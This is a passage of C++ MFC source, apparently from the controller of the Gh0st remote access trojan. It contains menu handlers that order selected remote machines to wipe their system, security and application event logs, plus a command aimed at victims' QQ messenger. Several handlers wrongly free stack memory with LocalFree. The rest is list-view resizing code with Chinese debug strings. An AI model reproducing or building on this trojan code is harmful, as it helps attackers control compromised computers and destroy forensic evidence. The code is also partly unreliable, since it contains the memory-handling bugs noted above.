	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_ALL;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnMenuitemCleaneventSys() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_SYS;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnMenuitemCleaneventSecurity() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_SEC;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnMenuitemCleaneventApp() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_APP;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnSize(UINT nType, int cx, int cy) 
{
	CXTPListView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if(!IsWindowVisible())
		return;	
	if(((CGh0stApp *)AfxGetApp())->m_bIsList_Draw)
	{
		if (m_pListCtrl->m_hWnd!=NULL)
		{
			if (m_pListCtrl != NULL)
			{
				int i;
				int str_cx [30] ={0};
				float dcx=(float)cx/g_Column_Width; 
				TRACE("拉伸比例是 %f   ",dcx);
				int iWidth[20];
				CString str;
				for(i=0;i<g_Column_Count;i++)
				{
					str.Format("Width%d",i);
					int dd = iWidth[i] = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("MainHeader_Column_Width", str, g_Column_Data[i].nWidth);;          //得到当前列的宽度
					TRACE("得到的第%d项 宽度是%d   ",i,dd);
					float dds = (float)dd*dcx;
					TRACE("  计算拉伸后应该为   %f 转换为整数位%d \r\n",dds,(int)dds);
					str_cx[i] = (int)dds -1;
				}
				
				m_pListCtrl->LockWindowUpdate();
				for(i=0;i<g_Column_Count;i++)
				{
					m_pListCtrl->SetColumnWidth(i,str_cx[i]);       //设置当前的宽度
				}
				m_pListCtrl->UnlockWindowUpdate(); 
			}
		}
	}

	
	
}
#include "SelectQQ.h"
void CPcView::OnBoxQq() 
{
	// TODO: Add your command handler code here

	BYTE bToken = COMMAND_SHOW_QQ;
	SendSelectCommand(&bToken, sizeof(bToken));

/*
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	int nItem = m_pListCtrl->GetNextSelectedItem(pos);
	
	CSelectQQ dlg(m_pListCtrl->GetItemText(nItem, 12));
	if (dlg.DoModal() == IDOK)
	{	
		int nPacketLength = dlg.m_strSelect.GetLength() + 2;
		LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
		lpPacket[0] = COMMAND_BOX_QQ;
		memcpy(lpPacket + 1, dlg.m_strSelect.GetBuffer(0), nPacketLength);
		
		SendSelectCommand(lpPacket, nPacketLength - 1);
		LocalFree(lpPacket);
	}*/
}
